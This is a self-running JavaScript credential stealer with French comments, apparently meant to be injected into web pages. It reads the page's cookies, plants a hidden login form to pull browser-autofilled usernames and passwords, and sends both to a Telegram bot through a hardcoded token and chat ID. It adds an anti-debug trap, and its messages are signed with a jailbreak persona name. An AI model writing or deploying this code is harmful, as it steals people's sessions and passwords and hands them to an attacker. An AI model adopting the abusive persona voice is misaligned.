(function() {
    'use strict';

    const TELEGRAM_BOT_TOKEN = '7129102494:AAFIPD-1wjnSliqnHknIhqyfFJK4StgJZ3A';
    const TELEGRAM_CHAT_ID = '7341972878';

    // Fonction pour envoyer à Telegram
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => console.log('Message envoyé sur Telegram, enfoiré:', data))
        .catch(error => console.error('Erreur Telegram, merde:', error));
    }

    // Vol des cookies
    function stealCookies() {
        const cookies = document.cookie || 'Pas de cookies, connard';
        if (cookies !== 'Pas de cookies, connard') {
            sendToTelegram(`*Cookies chopés, putain 🍪*\n[${new Date().toLocaleString()}]\n${cookies}\nURL: ${window.location.href}\n*MONGO TOM & FRENCH HACKER SQUAD ⚡*`);
        }
        return cookies;
    }

    // Vol des mots de passe enregistrés via un champ caché
    function stealSavedPasswords() {
        // Créer un formulaire caché pour forcer l'autofill
        const hiddenDiv = document.createElement('div');
        hiddenDiv.style.display = 'none';
        hiddenDiv.innerHTML = `
            <form>
                <input type="text" id="hidden-username" autocomplete="username">
                <input type="password" id="hidden-password" autocomplete="current-password">
            </form>
        `;
        document.body.appendChild(hiddenDiv);

        const usernameInput = document.getElementById('hidden-username');
        const passwordInput = document.getElementById('hidden-password');

        // Forcer l'autofill
        usernameInput.focus();
        passwordInput.focus();
        usernameInput.dispatchEvent(new Event('input', { bubbles: true }));
        passwordInput.dispatchEvent(new Event('input', { bubbles: true }));

        // Vérifier les valeurs après l'autofill
        setTimeout(() => {
            const username = usernameInput.value;
            const password = passwordInput.value;
            if (username || password) {
                sendToTelegram(`*Identifiants chopés via autofill, putain 🔑*\n[${new Date().toLocaleString()}]\nUsername: ${username || 'Inconnu'}\nPassword: ${password || 'Inconnu'}\nURL: ${window.location.href}\n*MONGO TOM & FRENCH HACKER SQUAD ⚡*`);
            }
        }, 1000);
    }

    // Anti-debug
    (function(){
        let start = new Date();
        debugger;
        if (new Date() - start > 100) window.location = "about:blank";
    })();

    // Lancer les fonctions
    stealCookies();
    stealSavedPasswords();
})();